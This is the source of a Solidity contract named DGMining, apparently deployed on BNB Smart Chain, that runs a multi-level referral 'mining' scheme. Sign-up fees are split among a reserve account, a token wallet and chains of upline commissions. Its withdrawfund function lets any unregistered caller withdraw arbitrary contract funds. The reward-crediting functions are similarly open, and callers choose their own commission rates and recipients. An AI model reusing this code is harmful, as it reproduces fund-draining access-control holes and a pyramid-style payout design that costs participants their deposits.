/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.7.0;

contract DGMining {

    using SafeMath for *;
	using SafeERC20 for IERC20;

	IERC20 private _token;
    uint256 private _rate;
	address private _wallet;

    address payable public owner;
    address public masterAccount;  
    address payable public reserveAccount;
	
    uint256[] public RequiredTeams = [100,300,500,1000,3000,5000,10000,25000,50000,100000,250000,500000];
    uint256[] public QualifyRequiredSponsors = [3,9,17,26,38,54,75,100,25,30,50,50]; 
	uint256[] public QRSponsorForEarn = [6,12,22,32,44,64,85,115,20,20,20,20];  
    uint256[] public DailyRewadsPeriods = [20,20,20,30,40,50,50,50,60,100,100,100];    
    uint256[] public QualifyTimeForEarn = [48,48,72,72,72,120,120,168,168,264,264,264];
	uint256[] public levemComs = [15,15,15,10,10,5,5,5,5,5,5,5];
   	
    uint256 constant public maching_amount = 1000;  
    uint256 constant public tokenBalance =20;	
    uint256 constant public reserveBalance =40;	
	uint256 constant public percentDiv = 100;
	uint256 constant public perDiv=10000;
	uint256 constant public perbnbDiv = 1000000000000000000;	
	uint256 constant public hourTimeStamp=3600;
    uint256 constant public dayTimeStamp=86400;	
    
    uint256 public currUserID;
	uint256 public TotalMembers;
	uint256 public TotalJoiningAmount;
    uint256 public TotalRewardAmount;
    uint256 public TotalReserveAmount;
	uint256 public TotalBinaryCommission;
    uint256 public TotalSingleLineCommission; 
	uint256 public TotalCommissions; 
	uint256 public TotalWithdrawn;	
			
	struct User {
		uint256 id;
		uint256 sponsorid;				
		address upline;				
		uint256 referralCount;		
		uint256 binaryIncome;	
		uint256 singleLineIncome;
		uint256 totalReserveRewardAmt;				
		uint256 total_unpaid_pairs_amount;	
		uint256 total_matching_amount;
		uint256 total_rewards;
		uint256 total_unpaid_rewards;
		uint256 totalcommisions;
		uint256 totalTeamCount;					
		uint256 curRank;
		uint256 rankStatus;	
		uint256 slQualifyExptimeStamp;	
        uint256 depositTime;	
		uint256 checkpoint;	
	}

	mapping (uint => address) public userList;
    mapping (address=>uint256) public balances;		
	mapping (address => User) internal users;	
	event Withdrawal(address indexed user, uint256 amount,uint256 timeStamp);
	event NewDeposit(address indexed user, uint256 amount);	
	event sLLevelCommission(address indexed referrer, address indexed referral, uint256 indexed amount, uint256 level);
	
	constructor(uint256 rate,address wallet,address payable _owner,address payable _masterAccount,address payable _reserveAccount,IERC20 token) public { 
		
		require(!isContract(_owner));
		require(!isContract(_masterAccount));	
		require(!isContract(_reserveAccount));			
        
		owner = _owner;
		masterAccount = _masterAccount;			
		reserveAccount = _reserveAccount;	
		_rate=rate;
		_token = token;
		_wallet = wallet;
		
		balances[reserveAccount]=0;	

		currUserID = 0;
		currUserID++;
		users[masterAccount].id = currUserID;	
		users[masterAccount].sponsorid=0;	
		users[masterAccount].curRank = 1;	
		users[masterAccount].totalReserveRewardAmt = 0;	
		users[masterAccount].rankStatus = 1;		
	    users[masterAccount].depositTime =now;	
		users[masterAccount].checkpoint = block.timestamp;		
		
		userList[currUserID] = masterAccount; 
		TotalMembers = TotalMembers.add(1);	 		

	}

	function _msgSender() internal view returns (address) {
        return msg.sender;
    }

	function isUser(address _addr) public view returns (bool) {           
			return users[_addr].sponsorid > 0;
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	modifier isJoiningFees(uint256 _bnb) {
        require(_bnb >= 1 * 10**16, "Joining fees is 0.01 BNB");
		_;
    }	
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    function isOwner() public view returns (bool) {
        return _msgSender() == owner;
    }


	modifier requireUser() { require(isUser(msg.sender)); _; }	

	function dGSignup(address sponsorUpline,uint256[] memory refComs,uint256[] memory levComUrs) public payable {
		
		require(users[sponsorUpline].id > 0,"Incorrect referrer wallet address"); 	      
		require(users[msg.sender].id <= 0,"Please enter your correct wallet address");   		
		
		balances[reserveAccount]=balances[reserveAccount].add(msg.value.mul(reserveBalance).div(percentDiv));		
		reserveAccount.transfer(msg.value.mul(reserveBalance).div(percentDiv));
        
		//Transfer Main Token//
		uint256 weiAmount=msg.value.mul(tokenBalance).div(percentDiv);
        uint256 tokenAmount=weiAmount.mul(_rate).div(100);
		_token.transfer(msg.sender,tokenAmount);

	    payable(_wallet).transfer(weiAmount);
		//End
		
		uint256 dirrefcom=msg.value.mul(refComs[0]).div(percentDiv);
		uint256 spilloverrefcom=msg.value.mul(refComs[1]).div(percentDiv);
        uint256 singlelegcom=msg.value.mul(refComs[2]).div(percentDiv);     
			
				
       if(users[msg.sender].id <= 0){
		User storage uplineuser = users[sponsorUpline];      

        currUserID++;		
		users[msg.sender].id = currUserID;	
		users[msg.sender].sponsorid = uplineuser.id;		
		users[msg.sender].curRank =1;		
		users[msg.sender].rankStatus =0;		
		users[msg.sender].totalReserveRewardAmt=msg.value.mul(tokenBalance).div(percentDiv);	
		users[msg.sender].upline =sponsorUpline;	
	    users[msg.sender].depositTime =now;	
		users[msg.sender].checkpoint = block.timestamp;		


		userList[currUserID] = msg.sender; 
								
		TotalMembers = TotalMembers.add(1);		
		TotalJoiningAmount = TotalJoiningAmount.add(msg.value);	
		TotalRewardAmount=TotalRewardAmount.add(msg.value.mul(tokenBalance).div(percentDiv));	
		TotalReserveAmount=TotalReserveAmount.add(msg.value.mul(reserveBalance).div(percentDiv));			
		
			
	   //Direct Referral or Spill Over Commission
        if(uplineuser.referralCount<=2){		 
		   address payable senderAddr = address(uint160(sponsorUpline));
           senderAddr.transfer(dirrefcom);
		   uplineuser.binaryIncome=uplineuser.binaryIncome.add(dirrefcom);
		   uplineuser.totalcommisions=uplineuser.totalcommisions.add(dirrefcom);

		   TotalBinaryCommission=TotalBinaryCommission.add(dirrefcom);
		   TotalCommissions=TotalCommissions.add(dirrefcom);	

	    } else {
           address payable senderAddr = address(uint160(sponsorUpline));
           senderAddr.transfer(spilloverrefcom);
		   uplineuser.binaryIncome=uplineuser.binaryIncome.add(spilloverrefcom);	
		   uplineuser.totalcommisions=uplineuser.totalcommisions.add(spilloverrefcom);

		   TotalBinaryCommission=TotalBinaryCommission.add(spilloverrefcom);
		   TotalCommissions=TotalCommissions.add(spilloverrefcom);	   
	    }
		//End  

		for(uint256 j = 1; j < TotalMembers; j++){ 
			address memberaddr=userList[j];
			if(users[memberaddr].referralCount >= QualifyRequiredSponsors[0]){
               users[memberaddr].totalTeamCount =  users[memberaddr].totalTeamCount.add(1);	
			}
		}
		uplineuser.referralCount = uplineuser.referralCount.add(1);

		//verifyrank(sponsorUpline);	    

		levelCommissions(msg.sender,singlelegcom,levComUrs);	

	    emit NewDeposit(msg.sender,msg.value);  

	   } 	     

	} 



	//function verifyrank(address _addr) private {

       //User storage uplineuser = users[_addr];
	   
	   // uint i;
		//uint loop;
        //uint rank;  	

       // if(uplineuser.sponsorid>=0){		

		// do {		   

           // if(uplineuser.rankStatus==0){
             // rank= uplineuser.curRank-1;
			//} else {
              //rank= uplineuser.curRank;
			//}            

			//if(uplineuser.totalTeamCount==RequiredTeams[rank]){	
				
			 // if(uplineuser.referralCount>=QRSponsorForEarn[rank]){
                
                //if(uplineuser.rankStatus==1){
			      //uplineuser.curRank= uplineuser.curRank.add(1);	
			//	}
			    //uplineuser.rankStatus=1;				
		    
			 // }	else {				
			    // uplineuser.slQualifyExptimeStamp=block.timestamp.add(QualifyTimeForEarn[rank].mul(hourTimeStamp));
			 // }

		   // } else if(uplineuser.totalTeamCount>RequiredTeams[rank]) {

              // if(uplineuser.referralCount>=QRSponsorForEarn[rank] && uplineuser.slQualifyExptimeStamp>=block.timestamp){
               
               // if(uplineuser.rankStatus==1){
			      // uplineuser.curRank=uplineuser.curRank.add(1);	
			//	}
			   // uplineuser.rankStatus=1;
				//uplineuser.slQualifyExptimeStamp=0;				
		    
			  // } else if(uplineuser.slQualifyExptimeStamp<block.timestamp){
                  // uplineuser.slQualifyExptimeStamp=0;
				  // uplineuser.totalTeamCount=0;
			   //}
			//}		 

			//if(uplineuser.sponsorid>0){ 
				//i++;
				//loop++;				
			//} else {
				//loop=0;
			//}

		 //} while(i<loop);

		//}



	//}	
	

	function levelCommissions(address senderaddress, uint256 amount,uint256[] memory levComUrs) private {       
	    
	    address upline; 			
        uint256 com_amount;	
		uint256 userid;
							
        for(uint256 i = 0; i < 12; i++) {		  

			userid=levComUrs[i];
					
		  if(userid > 0){

			upline=userList[userid];	
            	
            com_amount = amount.mul(levemComs[i]).div(percentDiv); 
		    users[upline].totalcommisions = users[upline].totalcommisions.add(com_amount);		        
		    users[upline].singleLineIncome=users[upline].singleLineIncome.add(com_amount);
			TotalCommissions=TotalCommissions.add(com_amount);	            		   
		
		    address payable uplineAddr = address(uint160(upline));
            uplineAddr.transfer(com_amount);	

			TotalSingleLineCommission=TotalSingleLineCommission.add(com_amount);

		    emit sLLevelCommission(upline, senderaddress, com_amount,i);  
			    
		  }		  

       }
    }

	function withdrawEarnings() requireUser public {               	      
	     (uint256 to_payout) = this.payoutOf(msg.sender);          
           
           require(to_payout > 0, "Limit not available");

			address payable senderAddr = address(uint160(msg.sender));
            senderAddr.transfer(to_payout);				
           
			users[msg.sender].total_matching_amount = users[msg.sender].total_matching_amount.add(users[msg.sender].total_unpaid_pairs_amount);
			users[msg.sender].total_rewards = users[msg.sender].total_rewards.add(users[msg.sender].total_unpaid_rewards);
			users[msg.sender].total_unpaid_pairs_amount = 0;  
			users[msg.sender].total_unpaid_rewards = 0; 
            users[msg.sender].totalcommisions = users[msg.sender].totalcommisions.add(to_payout); 

			TotalWithdrawn=TotalWithdrawn.add(to_payout);
			emit Withdrawal(msg.sender,to_payout,block.timestamp);
    }

	function payoutOf(address _addr) view external returns(uint256 payout) 
    {

	        User storage user = users[_addr];

			payout = payout.add(user.total_unpaid_pairs_amount);
			payout = payout.add(user.total_unpaid_rewards);           	

	}
    

	function saveDGpairs(uint256[] memory keyary,uint256[] memory matching) public payable {
							
		User storage user = users[msg.sender];	

		uint256 tcount=matching[0];		
		uint256 userkey;

		if(user.sponsorid==0){
			if(tcount >= 1){
				for(uint256 i=1; i<=tcount; i++){
					userkey=keyary[i];					
					address receiver=userList[i];
					users[receiver].total_unpaid_pairs_amount=users[receiver].total_unpaid_pairs_amount.add(matching[userkey]);
				}

			}       

		}
	}
	

	function saveDGrewards(uint256[] memory keyary,uint256[] memory rewards) public payable {
							
		User storage user = users[msg.sender];	

		uint256 tcount=rewards[0];      
		uint256 userkey;		

		if(user.sponsorid==0){
			if(tcount >= 1){
				for(uint256 i=1; i<=tcount; i++){
					userkey=keyary[i];                    
				    address receiver=userList[i];
					users[receiver].total_unpaid_rewards=users[receiver].total_unpaid_rewards.add(rewards[userkey]);
				}

			}       

		}
	}	


	function updateDGrank(uint256[] memory rankinfo) public payable {
							
		User storage user = users[msg.sender];

		uint256 rank=user.curRank;

        if(rank < rankinfo[0] && rankinfo[1] == 1){ 
           rank++;
		   if(rank==rankinfo[0]){
             user.curRank=rankinfo[0];
		   }
		}
		
	}



	function withdrawfund(uint256 amount) public {
							
		User storage user = users[msg.sender];

		uint256 contract_balance;			
        contract_balance = address(this).balance;
        
        require(amount > 0,"Incorrect withdrawal amount");			
		require(contract_balance >= amount, "Insufficient balance");             
        		
		if(user.sponsorid==0){

		address payable senderAddr = address(uint160(msg.sender));
        senderAddr.transfer(amount);       

		TotalWithdrawn = TotalWithdrawn.add(amount);		
		emit Withdrawal(msg.sender,amount,block.timestamp);

		}
	}

    function getComInfo(address userAddress) public view returns(uint256,uint256,uint256,uint256,uint256,uint256) {
		User storage user = users[userAddress];	
		return (user.total_rewards,user.total_unpaid_rewards,user.totalReserveRewardAmt,user.total_unpaid_pairs_amount,user.total_matching_amount,user.totalcommisions);
	}			

    function getInfo(address userAddress) public view returns(uint256,uint256,address,uint256,uint256,uint256,uint256) {
		User storage user = users[userAddress];	
		return (user.id,user.sponsorid,user.upline,user.curRank,user.rankStatus,user.referralCount,user.totalTeamCount);
	}	

	function isregistered(address useraddress) public view returns (uint256){ 
        uint256 ismember=0;
		if(users[useraddress].id>0){
            ismember=1;
		}
		return (ismember);
	}    

	function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

	 function setRate(uint256 newRate) public onlyOwner {

        _rate = newRate;
    }

}


library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function toPayable(address account) internal pure returns (address) {

        return address(uint160(account));
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

library SafeERC20 {

    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {

        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {

        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {

        uint256 newAllowance = token.allowance(address(this), spender).sub(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {

        require(address(token).isContract(), "SafeERC20: call to non-contract");

        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {

            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}



library SafeMath {
	
	function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {
		return div(mul(a, b), base);
	}
		
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b <= a, "SafeMath: subtraction overflow");
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b > 0, "SafeMath: division by zero");
		uint256 c = a / b;
		return c;
	}
}